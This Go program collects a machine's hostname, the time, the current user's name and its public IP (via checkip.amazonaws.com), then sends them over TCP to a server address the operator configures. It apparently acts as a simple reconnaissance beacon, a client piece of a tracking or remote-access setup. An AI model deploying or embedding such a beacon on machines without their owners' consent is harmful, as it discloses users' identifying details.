package main

// Import modules
import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/user"
	"time"
)

// Constant variables declarations
const (
	PROTOCOL  = "tcp"
	IPADDRESS = "127.0.0.1" // Enter servers IP, instead of 127.0.0.1
	PORT      = ":1111"     // Change to chosen port, instead of :1111, to see if a specific TCP port is free you can use my JDTB-InGo
)

func main() {
	SendData(ConstructMsg())
}

// SendData sends the data collected to the server
func SendData(msg string) bool {
	connection, _ := net.Dial(PROTOCOL, IPADDRESS+PORT)
	fmt.Fprintf(connection, msg)

	return true
}

// ConstructMsg gets the relevent system information
func ConstructMsg() string {
	var message string

	// Get info
	hostname, _ := os.Hostname()
	time := time.Now()
	user, _ := user.Current()
	ip := CheckIP()

	// Construct message
	message += hostname + "\n"
	message += time.String() + "\n"
	message += user.Name + "\n"
	message += ip + "|"

	return message // Return it to send to server
}

// CheckIP requests the public IP of the PC from a website
func CheckIP() string {
	htmlIP, _ := http.Get("http://checkip.amazonaws.com")

	defer htmlIP.Body.Close()

	buf, _ := ioutil.ReadAll(htmlIP.Body)
	return string(bytes.TrimSpace(buf))
}
